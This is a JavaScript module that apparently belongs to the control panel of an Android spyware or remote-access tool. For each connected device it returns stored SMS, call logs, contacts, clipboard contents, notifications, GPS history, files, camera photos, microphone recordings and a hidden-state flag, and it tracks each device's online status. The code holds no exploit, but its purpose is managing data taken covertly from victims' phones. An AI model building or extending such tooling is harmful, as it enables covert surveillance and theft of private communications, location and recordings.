// Client Pages Data Module

import db from '../database/db.js';
import { logger } from '../logs/logs.js';

const getDb = (dbs, id) => {
    if (dbs.has && dbs.get) {
        if (dbs.has(id)) return dbs.get(id);
        const clientDb = db.getClient(id);
        if (clientDb) dbs.set(id, clientDb);
        return clientDb;
    }
    if (!dbs[id]) dbs[id] = db.getClient(id);
    return dbs[id];
};

const getData = (dbs, getClient, id, page) => {
    try {
        const cdb = getDb(dbs, id);
        const client = getClient(id);
        if (!client && !cdb) return null;

        const pages = {
            info: () => ({
                client: client || null,
                deviceInfo: cdb?.get('deviceInfo').value() || null
            }),
            sms: () => ({ list: cdb?.get('sms').value() || [] }),
            calls: () => ({ list: cdb?.get('calls').value() || [] }),
            contacts: () => ({ list: cdb?.get('contacts').value() || [] }),
            wifi: () => ({
                list: cdb?.get('wifi').value() || [],
                error: cdb?.get('wifiError').value() || null
            }),
            clipboard: () => ({ list: (cdb?.get('clipboard').value() || []).slice(-100) }),
            notifications: () => ({ list: (cdb?.get('notifications').value() || []).slice(-100) }),
            permissions: () => ({ list: cdb?.get('permissions').value() || [] }),
            apps: () => ({ list: cdb?.get('apps').value() || [] }),
            gps: () => ({
                list: (cdb?.get('gps').value() || []).slice(-50),
                interval: cdb?.get('gpsInterval').value() || cdb?.get('state.gpsInterval').value() || 0
            }),
            files: () => ({
                list: cdb?.get('files').value() || [],
                path: cdb?.get('currentPath').value() || cdb?.get('state.currentPath').value() || ''
            }),
            downloads: () => ({ list: cdb?.get('downloads').value() || [] }),
            camera: () => ({
                cameras: cdb?.get('cameras').value() || cdb?.get('state.cameras').value() || [],
                photos: (cdb?.get('photos').value() || []).slice(-50),
                permission: cdb?.get('cameraPermission').value() || cdb?.get('state.cameraPermission').value() || false
            }),
            mic: () => ({ list: (cdb?.get('recordings').value() || []).slice(-50) }),
            fason: () => ({
                hidden: cdb?.get('fasonHidden').value() || cdb?.get('state.fasonHidden').value() || false
            }),
            notfound: () => ({ client: client || null })
        };

        return pages[page] ? pages[page]() : pages.notfound();
    } catch (e) {
        logger.systemError(`Error getting page data for ${id}/${page}`, e);
        return null;
    }
};

const getConnectionStatus = (dbs, id) => {
    const cdb = getDb(dbs, id);
    return {
        online: cdb?.get('connection.online').value() || false,
        lastSeen: cdb?.get('connection.lastSeen').value() || cdb?.get('lastUpdated').value() || null,
        reconnectCount: cdb?.get('connection.reconnectCount').value() || 0
    };
};

const updateData = (dbs, id, path, value) => {
    const cdb = getDb(dbs, id);
    if (!cdb) return false;
    try {
        cdb.set(path, value).write();
        cdb.set('lastUpdated', new Date().toISOString()).write();
        return true;
    } catch (e) {
        return false;
    }
};

const appendData = (dbs, id, path, item) => {
    const cdb = getDb(dbs, id);
    if (!cdb) return false;
    try {
        cdb.get(path).push(item).write();
        cdb.set('lastUpdated', new Date().toISOString()).write();
        return true;
    } catch (e) {
        return false;
    }
};

const clearCache = (dbs, id) => {
    if (dbs.has && dbs.delete) {
        dbs.delete(id);
    } else {
        delete dbs[id];
    }
};

const getCacheSize = (dbs) => {
    if (dbs.size !== undefined) return dbs.size;
    return Object.keys(dbs).length;
};

const pages = {
    getDb,
    getData,
    getConnectionStatus,
    updateData,
    appendData,
    clearCache,
    getCacheSize
};

export default pages;

export {
    getDb,
    getData,
    getConnectionStatus,
    updateData,
    appendData,
    clearCache,
    getCacheSize
};
